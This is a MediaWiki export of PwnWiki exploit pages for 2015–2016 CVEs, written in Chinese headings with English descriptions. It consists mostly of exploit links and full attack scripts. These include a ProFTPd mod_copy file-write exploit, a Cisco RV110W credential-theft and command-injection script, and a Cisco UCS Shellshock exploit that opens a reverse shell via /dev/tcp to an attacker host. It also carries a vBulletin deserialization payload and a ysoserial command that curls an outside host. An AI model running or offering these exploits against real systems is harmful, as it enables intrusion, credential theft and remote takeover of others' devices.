<mediawiki xmlns="http://www.mediawiki.org/xml/export-0.11/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.mediawiki.org/xml/export-0.11/ http://www.mediawiki.org/xml/export-0.11.xsd" version="0.11" xml:lang="chinese">
  <siteinfo>
    <sitename>PwnWiki</sitename>
    <dbname>sql_www_pwnwiki_</dbname>
    <base>https://www.pwnwiki.org/index.php?title=Main_Page</base>
    <generator>MediaWiki 1.35.1</generator>
    <case>first-letter</case>
    <namespaces>
      <namespace key="-2" case="first-letter">Media</namespace>
      <namespace key="-1" case="first-letter">Special</namespace>
      <namespace key="0" case="first-letter" />
      <namespace key="1" case="first-letter">Talk</namespace>
      <namespace key="2" case="first-letter">User</namespace>
      <namespace key="3" case="first-letter">User talk</namespace>
      <namespace key="4" case="first-letter">PwnWiki</namespace>
      <namespace key="5" case="first-letter">PwnWiki talk</namespace>
      <namespace key="6" case="first-letter">File</namespace>
      <namespace key="7" case="first-letter">File talk</namespace>
      <namespace key="8" case="first-letter">MediaWiki</namespace>
      <namespace key="9" case="first-letter">MediaWiki talk</namespace>
      <namespace key="10" case="first-letter">Template</namespace>
      <namespace key="11" case="first-letter">Template talk</namespace>
      <namespace key="12" case="first-letter">Help</namespace>
      <namespace key="13" case="first-letter">Help talk</namespace>
      <namespace key="14" case="first-letter">Category</namespace>
      <namespace key="15" case="first-letter">Category talk</namespace>
      <namespace key="274" case="first-letter">Widget</namespace>
      <namespace key="275" case="first-letter">Widget talk</namespace>
      <namespace key="710" case="first-letter">TimedText</namespace>
      <namespace key="711" case="first-letter">TimedText talk</namespace>
      <namespace key="828" case="first-letter">Module</namespace>
      <namespace key="829" case="first-letter">Module talk</namespace>
      <namespace key="1198" case="first-letter">Translations</namespace>
      <namespace key="1199" case="first-letter">Translations talk</namespace>
    </namespaces>
  </siteinfo>
  <page>
    <title>CVE-2015-0057 Win32k特權提升漏洞</title>
    <ns>0</ns>
    <id>894</id>
    <revision>
      <id>1161</id>
      <timestamp>2021-04-08T01:45:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== win32k.sys in the kernel-mode drivers in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8..."</comment>
      <origin>1161</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="431" sha1="cy31gh3nl1vn7hkvj34dglo67ty4rp2" xml:space="preserve">==INFO==
win32k.sys in the kernel-mode drivers in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, Windows Server 2012 Gold and R2, and Windows RT Gold and 8.1 allows local users to gain privileges via a crafted application, aka "Win32k Elevation of Privilege Vulnerability."

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2015-0057.zip</text>
      <sha1>cy31gh3nl1vn7hkvj34dglo67ty4rp2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2015-0204 FREAK SSL/TLS 中間人劫持漏洞</title>
    <ns>0</ns>
    <id>1406</id>
    <revision>
      <id>1774</id>
      <timestamp>2021-04-20T06:13:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Tool== https://github.com/drwetter/testssl.sh  ==Usage== &lt;pre&gt; ./testssl.sh -F &lt;IP ADDRESS&gt; &lt;/pre&gt;"</comment>
      <origin>1774</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="100" sha1="5mxhrfqetgcoqryb61ad493cqomyqfv" xml:space="preserve">==Tool==
https://github.com/drwetter/testssl.sh

==Usage==
&lt;pre&gt;
./testssl.sh -F &lt;IP ADDRESS&gt;
&lt;/pre&gt;</text>
      <sha1>5mxhrfqetgcoqryb61ad493cqomyqfv</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2015-0313 Adobe Flash Player before 13.0.0.269 and 14.x through 16.x before 16.0.0.305 任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>895</id>
    <revision>
      <id>1162</id>
      <timestamp>2021-04-08T01:48:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Use-after-free vulnerability in Adobe Flash Player before 13.0.0.269 and 14.x through 16.x before 16.0.0.305 on Windows and OS X and before 11.2.202.442 on Linux allo..."</comment>
      <origin>1162</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="444" sha1="7d1z7tdopmf0opiuyy4m7mbtm1uar73" xml:space="preserve">==INFO==
Use-after-free vulnerability in Adobe Flash Player before 13.0.0.269 and 14.x through 16.x before 16.0.0.305 on Windows and OS X and before 11.2.202.442 on Linux allows remote attackers to execute arbitrary code via unspecified vectors, as exploited in the wild in February 2015, a different vulnerability than CVE-2015-0315, CVE-2015-0320, and CVE-2015-0322.

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/cve-2015-0313.zip</text>
      <sha1>7d1z7tdopmf0opiuyy4m7mbtm1uar73</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2015-0568 Linux kernel 3.x 特權提升&amp;拒絕服務漏洞</title>
    <ns>0</ns>
    <id>896</id>
    <revision>
      <id>1163</id>
      <timestamp>2021-04-08T01:54:27Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Use-after-free vulnerability in the msm_set_crop function in drivers/media/video/msm/msm_camera.c in the MSM-Camera driver for the Linux kernel 3.x, as used in Qualco..."</comment>
      <origin>1163</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="473" sha1="r1ke0yoxyjb4nuw24bxul1wa3w0dqby" xml:space="preserve">==INFO==
Use-after-free vulnerability in the msm_set_crop function in drivers/media/video/msm/msm_camera.c in the MSM-Camera driver for the Linux kernel 3.x, as used in Qualcomm Innovation Center (QuIC) Android contributions for MSM devices and other products, allows attackers to gain privileges or cause a denial of service (memory corruption) via an application that makes a crafted ioctl call.

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2015-0568.zip</text>
      <sha1>r1ke0yoxyjb4nuw24bxul1wa3w0dqby</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2015-1157 Apple iOS 8.x through 8.3拒絕服務漏洞</title>
    <ns>0</ns>
    <id>897</id>
    <revision>
      <id>1164</id>
      <timestamp>2021-04-08T01:57:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== CoreText in Apple iOS 8.x through 8.3 allows remote attackers to cause a denial of service (reboot and messaging disruption) via crafted Unicode text that is not prop..."</comment>
      <origin>1164</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="405" sha1="0bdq2ptj9r71qfqpwguxb5sgy5rtwe3" xml:space="preserve">==INFO==
CoreText in Apple iOS 8.x through 8.3 allows remote attackers to cause a denial of service (reboot and messaging disruption) via crafted Unicode text that is not properly handled during display truncation in the Notifications feature, as demonstrated by Arabic characters in (1) an SMS message or (2) a WhatsApp message.

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2015-1157.zip</text>
      <sha1>0bdq2ptj9r71qfqpwguxb5sgy5rtwe3</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2015-1318 Apport 2.13 through 2.17.x before 2.17.1 特權提升漏洞</title>
    <ns>0</ns>
    <id>898</id>
    <revision>
      <id>1165</id>
      <timestamp>2021-04-08T01:58:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== The crash reporting feature in Apport 2.13 through 2.17.x before 2.17.1 allows local users to gain privileges via a crafted usr/share/apport/apport file in a namespac..."</comment>
      <origin>1165</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="265" sha1="5eao594n0qy2y0a1g1oaym76vv0sddw" xml:space="preserve">==INFO==
The crash reporting feature in Apport 2.13 through 2.17.x before 2.17.1 allows local users to gain privileges via a crafted usr/share/apport/apport file in a namespace (container).

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2015-1318.zip</text>
      <sha1>5eao594n0qy2y0a1g1oaym76vv0sddw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2015-1328 linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 特權提升漏洞</title>
    <ns>0</ns>
    <id>899</id>
    <revision>
      <id>1166</id>
      <timestamp>2021-04-08T02:01:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== The overlayfs implementation in the linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file creation..."</comment>
      <origin>1166</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="428" sha1="gch6t4y7rut9h1chxaamy973mbqpzha" xml:space="preserve">==INFO==
The overlayfs implementation in the linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file creation in the upper filesystem directory, which allows local users to obtain root access by leveraging a configuration in which overlayfs is permitted in an arbitrary mount namespace.

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2015-1328.zip</text>
      <sha1>gch6t4y7rut9h1chxaamy973mbqpzha</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2015-1427 Elasticsearch遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>900</id>
    <revision>
      <id>1167</id>
      <timestamp>2021-04-08T02:02:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Elasticsearch 1.4.0 / 1.4.2 Remote Code Execution  ==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2015-1427.zip"</comment>
      <origin>1167</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="134" sha1="0t80k1dndtailbahaapxl4qr4c84in9" xml:space="preserve">==INFO==
Elasticsearch 1.4.0 / 1.4.2 Remote Code Execution

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2015-1427.zip</text>
      <sha1>0t80k1dndtailbahaapxl4qr4c84in9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2015-1474 Android through 5.0 特權提升&amp;拒絕服務漏洞</title>
    <ns>0</ns>
    <id>901</id>
    <revision>
      <id>1168</id>
      <timestamp>2021-04-08T02:04:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Multiple integer overflows in the GraphicBuffer::unflatten function in platform/frameworks/native/libs/ui/GraphicBuffer.cpp in Android through 5.0 allow attackers to..."</comment>
      <origin>1168</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="402" sha1="4y7zie6y3sa021a8iibs4no4v8yoiht" xml:space="preserve">==INFO==
Multiple integer overflows in the GraphicBuffer::unflatten function in platform/frameworks/native/libs/ui/GraphicBuffer.cpp in Android through 5.0 allow attackers to gain privileges or cause a denial of service (memory corruption) via vectors that trigger a large number of (1) file descriptors or (2) integer values.

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2015-1474.zip</text>
      <sha1>4y7zie6y3sa021a8iibs4no4v8yoiht</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2015-3306 ProFTPd 1.3.5 - 'mod copy' 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>2788</id>
    <revision>
      <id>3289</id>
      <timestamp>2021-05-26T12:17:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2) # Date: 25/05/2021 # Exploit Author: Shellbr3ak # Version: 1.3.5  # Tested on: Ubuntu 16..."</comment>
      <origin>3289</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1404" sha1="r2wifb3787qnabb9imwqlbkp2nay1q2" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)
# Date: 25/05/2021
# Exploit Author: Shellbr3ak
# Version: 1.3.5 
# Tested on: Ubuntu 16.04.6 LTS
# CVE : CVE-2015-3306

#!/usr/bin/env python3

import sys
import socket
import requests

def exploit(client, target):
    client.connect((target,21)) # Connecting to the target server
    banner = client.recv(74)
    print(banner.decode())
    client.send(b'site cpfr /etc/passwd\r\n')
    print(client.recv(1024).decode())
    client.send(b'site cpto &lt;?php phpinfo(); ?&gt;\r\n') # phpinfo() is just a PoC.
    print(client.recv(1024).decode())
    client.send(b'site cpfr /proc/self/fd/3\r\n')
    print(client.recv(1024).decode())
    client.send(b'site cpto /var/www/html/test.php\r\n')
    print(client.recv(1024).decode())
    client.close()
    print('Exploit Completed')

def check(url):
    req = requests.get(url) # Requesting the written PoC php file via HTTP
    if req.status_code == 200:
        print('[+] File Written Successfully')
        print(f'[+] Go to : {url}')
    else:
        print('[!] Something Went Wrong')
        print('[!] Directory might not be writable')

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target = sys.argv[1]
    exploit(client, target)
    url = 'http://' + target + '/test.php'
    check(url)

if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>r2wifb3787qnabb9imwqlbkp2nay1q2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2015-4000 SSL/TLS LogJam中間人安全限制繞過漏洞</title>
    <ns>0</ns>
    <id>1407</id>
    <revision>
      <id>1775</id>
      <timestamp>2021-04-20T06:14:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Tool== https://github.com/drwetter/testssl.sh  ==Usage== &lt;pre&gt; ./testssl.sh -J &lt;IP ADDRESS&gt; &lt;/pre&gt;"</comment>
      <origin>1775</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="100" sha1="tbeygfo3jnxar7ba68bnkj2qui7j5s6" xml:space="preserve">==Tool==
https://github.com/drwetter/testssl.sh

==Usage==
&lt;pre&gt;
./testssl.sh -J &lt;IP ADDRESS&gt;
&lt;/pre&gt;</text>
      <sha1>tbeygfo3jnxar7ba68bnkj2qui7j5s6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2015-6396 Cisco RV110W Password Disclosure 命令注入漏洞</title>
    <ns>0</ns>
    <id>1199</id>
    <revision>
      <id>1503</id>
      <timestamp>2021-04-11T01:18:09Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/env python2  ##### ## Cisco RV110W Password Disclosure and OS Command Execute. ### Tested on version: 1.1.0.9 (maybe useable on 1.2.0.9 and later.)  #..."</comment>
      <origin>1503</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3571" sha1="ng078m46m3epbr22oyvbk2f8w44j639" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/env python2

#####
## Cisco RV110W Password Disclosure and OS Command Execute.
### Tested on version: 1.1.0.9 (maybe useable on 1.2.0.9 and later.)

# Exploit Title: Cisco RV110W Password Disclosure and OS Command Execute
# Date: 2018-08
# Exploit Author: RySh
# Vendor Homepage: https://www.cisco.com/
# Version: 1.1.0.9
# Tested on: RV110W 1.1.0.9
# CVE : CVE-2014-0683, CVE-2015-6396

import os
import sys
import re
import urllib
import urllib2
import getopt
import json

import ssl

ssl._create_default_https_context = ssl._create_unverified_context

###
# Usage: ./{script_name} 192.168.1.1 443 "reboot"
###

if __name__ == "__main__":
    IP = argv[1]
    PORT = argv[2]
    CMD = argv[3]
    
    # Get session key, Just access index page.
    url = 'https://' + IP + ':' + PORT + '/'
    req = urllib2.Request(url)
    result = urllib2.urlopen(req)
    res = result.read()
    
    # parse 'admin_pwd'! -- Get credits
    admin_user = re.search(r'.*(.*admin_name=\")(.*)\"', res).group().split("\"")[1]
    admin_pwd = re.search(r'.*(.*admin_pwd=\")(.{32})', res).group()[-32:]
    print "Get Cred. Username = " + admin_user + ", PassHash = " + admin_pwd

    # Get session_id by POST
    req2 = urllib2.Request(url + "login.cgi")
    req2.add_header('Origin', url)
    req2.add_header('Upgrade-Insecure-Requests', 1)
    req2.add_header('Content-Type', 'application/x-www-form-urlencoded')
    req2.add_header('User-Agent',
                    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko)')
    req2.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8')
    req2.add_header('Referer', url)
    req2.add_header('Accept-Encoding', 'gzip, deflate')
    req2.add_header('Accept-Language', 'en-US,en;q=0.9')
    req2.add_header('Cookie', 'SessionID=')
    data = {"submit_button": "login",
            "submit_type": "",
            "gui_action": "",
            "wait_time": "0",
            "change_action": "",
            "enc": "1",
            "user": admin_user,
            "pwd": admin_pwd,
            "sel_lang": "EN"
            }
    r = urllib2.urlopen(req2, urllib.urlencode(data))
    resp = r.read()
    login_st = re.search(r'.*login_st=\d;', resp).group().split("=")[1]
    session_id = re.search(r'.*session_id.*\";', resp).group().split("\"")[1]

    # Execute your commands via diagnose command parameter, default command is `reboot`
    req3 = urllib2.Request(url + "apply.cgi;session_id=" + session_id)
    req3.add_header('Origin', url)
    req3.add_header('Upgrade-Insecure-Requests', 1)
    req3.add_header('Content-Type', 'application/x-www-form-urlencoded')
    req3.add_header('User-Agent',
                    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko)')
    req3.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8')
    req3.add_header('Referer', url)
    req3.add_header('Accept-Encoding', 'gzip, deflate')
    req3.add_header('Accept-Language', 'en-US,en;q=0.9')
    req3.add_header('Cookie', 'SessionID=')
    data_cmd = {"submit_button": "Diagnostics",
            "change_action": "gozila_cgi",
            "submit_type": "start_ping",
            "gui_action": "",
            "traceroute_ip": "",
            "commit": "1",
            "ping_times": "3 |" + CMD + "|",
            "ping_size": "64",
            "wait_time": "4",
            "ping_ip": "127.0.0.1",
            "lookup_name": ""
            }
    r = urllib2.urlopen(req3, urllib.urlencode(data_cmd))
&lt;/pre&gt;</text>
      <sha1>ng078m46m3epbr22oyvbk2f8w44j639</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2015-6435 Cisco UCS Manager 2.2(1d) 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>3232</id>
    <revision>
      <id>3770</id>
      <timestamp>2021-05-31T04:09:09Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Cisco UCS Manager version 2.2(1d) remote command execution exploit. An unspecified CGI script in Cisco FX-OS before 1.1.2 on Firepower 9000 devices and Cisco Unified..."</comment>
      <origin>3770</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7165" sha1="atvm5qp3mtwjvgx67crlz8ytvkq9whs" xml:space="preserve">==INFO==
Cisco UCS Manager version 2.2(1d) remote command execution exploit. An unspecified CGI script in Cisco FX-OS before 1.1.2 on Firepower 9000 devices and Cisco Unified Computing System (UCS) Manager before 2.2(4b), 2.2(5) before 2.2(5a), and 3.0 before 3.0(2e) allows remote attackers to execute arbitrary shell commands via a crafted HTTP request, aka Bug ID CSCur90888.

==EXP==
&lt;pre&gt;
import sys, ssl, os, time
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#
# Exploit Title         : Cisco UCS Manager - 2.2(1d) - Remote Command Execution
# Description           : An unspecified CGI script in Cisco FX-OS before 1.1.2 on Firepower 9000 devices and Cisco Unified Computing System (UCS) Manager before 2.2(4b), 2.2(5) before 2.2(5a), and 3.0 before 3.0(2e) allows remote attackers to execute arbitrary shell commands via a crafted HTTP request, aka Bug ID CSCur90888.
# Date                  : 1/15/2021
# Exploit Author        : liquidsky (J.McPeters)
# Vulnerable Software   : Cisco UCS Manager - 2.2(1d) -&gt; [According to the vendor (cisco), this is known to impact versions prior to 3.0(2e).]
# Vendor Homepage       : https://www.cisco.com/c/en/us/products/servers-unified-computing/ucs-manager/index.html
# Version               : 2.2(1d), 2.2(3c)A
# Cisco Reference       : https://quickview.cloudapps.cisco.com/quickview/bug/CSCur90888
# Tested On             : Cisco UCS Manager - 2.2(1d) (Exploit ran with Debian 5.6.7-1kali1 (Kali 2020.1 x64))
# Author Site           : https://github.com/fuzzlove/Cisco-UCS-Manager-2.2-1d-Remote-Command-Execution
# Demo                  : https://youtu.be/bZAcJrwPEb0
# CVE                   : CVE-2015-6435 | https://nvd.nist.gov/vuln/detail/CVE-2015-6435
# Special Notes         : This application by default uses outdated TLS 1.0 for communication, so thats why there is a quickfix/temporary patch to 1.0 in openssl utilizing 'sed' (that gets changes back after exploitation).
#
# Greetz: wetw0rk, Fr13ndz, O.G.Xx25, MS, SS, JK, the S3 family, and last but NOT least droppunx ^_~
#

print "+-------------------------------------------------------------+"
print
print "-       Cisco Unified Computing System Manager CGI RCE "
print
print "          Cisco UCS Manager - 2.2(1d) - CVE-2015-6435"
print
print "-   PoC by: LiquidSky - 1/15/21  |  CISCO-BUG-ID:  CSCur90888   "
print
print "+-------------------------------------------------------------+"

try:

  target    = sys.argv[1]
  shellip    = sys.argv[2]
  shellport  = sys.argv[3]

except IndexError:

        print
  print "- Usage: %s &lt;vuln-site&gt; &lt;listener-ip&gt; &lt;listener-port&gt;" % sys.argv[0]
  print "- Example: %s https://ciscoucsmgr 192.168.1.123 443" % sys.argv[0]
        print
  sys.exit()
  
def ch3x_w00t():
     if os.geteuid()==0:
         print "[*] Running exploit as root."
     else:
         print "[!] You are not root, be sure you can change /etc/ssl/openssl.cnf"
         print "[x] Most likely going to see an error..."
         time.sleep(5)

# Performs backup of openssl.cnf just in case and performs checks of existing vulnerable pages...
def cisco_vuln():
     ch3x_w00t()
     print "[x] Backing up /etc/ssl/openssl.cnf to /etc/ssl/openssl.bak (just in case)"
     os.system("cp /etc/ssl/openssl.cnf /etc/ssl/openssl.bak")
     os.system("sed -i 's/MinProtocol = TLSv1.2/MinProtocol = TLSv1.0/' /etc/ssl/openssl.cnf")
     print "[*] Checking vulnerable URL "
     headers1 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
     cisco_url = "" + target + "/ucsm/isSamInstalled.cgi"
#Checking page
     check = requests.get(cisco_url, headers=headers1, verify=False)
#Grabbing response
     res = check.text
     if "true" in res:
         return True
     return False

# Safety check - make sure the user is okay with the TLS1.0 temp fix
# Shout out to Dean ^^ for keeping me polite...

def exploit_question():
      print "[x] Warning the service by default uses TLS1.0 so . . ."
      print
      print "[?] This exploit temporarily patches '/etc/ssl/openssl.cnf' to use TLS1.0 using 'sed' and then changes back to TLS1.2"
      print
      print "[!] A backup is placed in /etc/ssl/openssl.bak just to be safe..."
      print
      question = raw_input('[!] Do you wish to continue, "yes" or "no" ?')
      if question == 'yes':
          print
          print "[!] Great attempting exploitation checks: " + target + '!'
          cisco_vuln()
      else:
          print
          print "[x] Stay safe m8 ;) - Read the source, its safe . . "
          print
          sys.exit()

exploit_question()

def cisco_response():
     headers1 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
     cisco_url = "" + target + "/ucsm/isSamInstalled.cgi"
     request = requests.get(cisco_url, headers=headers1, verify=False)
     if request.status_code == 200:
         print "[x] Page seems to exist -- Possibly vulnerable?"
     else:
         print "[!] Page does not exist - Not vulnerable"
         print "[x] Switching back to TLS v1.2 - backup file should be in /etc/ssl/openssl.bak (just in case)"
         os.system("sed -i 's/MinProtocol = TLSv1.0/MinProtocol = TLSv1.2/' /etc/ssl/openssl.cnf")
         sys.exit()

def cisco_exploit():
     cisco_url = "" + target + "/ucsm/isSamInstalled.cgi"
     headers = {"User-Agent": "() { ignored;};/bin/bash -i &gt;&amp; /dev/tcp/" + shellip + "/" + shellport + " 0&gt;&amp;1", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

     print "[x] Sending Shell to IP: " + shellip + " Port: " + shellport + ""
     print "[?] If this works you will see the exploit hang"

     requests.get(cisco_url, headers=headers, verify=False)
     print "[!] Shell Sent"

cisco_exploit()

def main():
     if cisco_vuln():
         print ""
         print "[+] Perhaps success?"
         print ""
         print "  ^_~  got shellz?   - [ liquidsky | 2021 ]"
         print
         print "[x] Switching back to TLS v1.2 - backup file should be in /etc/ssl/openssl.bak (just in case)"
         os.system("sed -i 's/MinProtocol = TLSv1.0/MinProtocol = TLSv1.2/' /etc/ssl/openssl.cnf")
     else:         
         print "[-] failure!"
         print "[x] Switching back to TLS v1.2 - backup file should be in /etc/ssl/openssl.bak (just in case)"
         os.system("sed -i 's/MinProtocol = TLSv1.0/MinProtocol = TLSv1.2/' /etc/ssl/openssl.cnf")
 
if __name__ == "__main__":
     main()
&lt;/pre&gt;</text>
      <sha1>atvm5qp3mtwjvgx67crlz8ytvkq9whs</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2015-7808 VBulletin VBulletin 5.1.4 - 5.1.9 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>2050</id>
    <revision>
      <id>2475</id>
      <timestamp>2021-05-05T06:52:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Payload== &lt;pre&gt; http://0-sec.org/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A..."</comment>
      <origin>2475</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="353" sha1="qgcplsnmpjnvuzn4cum0rylzozknuva" xml:space="preserve">==Payload==
&lt;pre&gt;
http://0-sec.org/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A9%3A%22phpinfo%28%29%22%3B%7D
&lt;/pre&gt;</text>
      <sha1>qgcplsnmpjnvuzn4cum0rylzozknuva</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2015-8103 Jenkins反序列化遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>148</id>
    <revision>
      <id>243</id>
      <timestamp>2021-03-09T07:48:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Exploit== https://github.com/LeoHuang2015/jenkins-cli-exploit  ==MSF== &lt;pre&gt; exploit/linux/misc/jenkins_java_deserialize &lt;/pre&gt;"</comment>
      <origin>243</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="129" sha1="r3n3xm77r3fbhb4xucbb0n58wmafo2n" xml:space="preserve">==Exploit==
https://github.com/LeoHuang2015/jenkins-cli-exploit

==MSF==
&lt;pre&gt;
exploit/linux/misc/jenkins_java_deserialize
&lt;/pre&gt;</text>
      <sha1>r3n3xm77r3fbhb4xucbb0n58wmafo2n</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-0788 Jenkins CI和LTS 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>149</id>
    <revision>
      <id>244</id>
      <timestamp>2021-03-09T07:51:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==簡介== CloudBeesJenkinsCI1.650之前版本和LTS1.642.2之前版本的remoting模塊中存在安全漏洞。遠程攻擊者可通過打開JRMP..."</comment>
      <origin>244</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="625" sha1="oihow64hek332i6zl1l7eypx34hru04" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==簡介==
CloudBeesJenkinsCI1.650之前版本和LTS1.642.2之前版本的remoting模塊中存在安全漏洞。遠程攻擊者可通過打開JRMP監聽程序利用該漏洞執行任意代碼。

利用需要X-Jenkins-CLI2-Port對應的端口，如果Jenkins無法獲取CLI版本2的端口標頭&lt;code&gt;X-Jenkins-CLI2-Port&lt;/code&gt;它會退回到版本1。

==利用ys生成二進製文件==
&lt;pre&gt;
java -jar ysoserial.jar CommonsCollections3 "curl http://r9rub4.ceye.io/" &gt; payload.bin
&lt;/pre&gt;

==利用腳本==
https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py

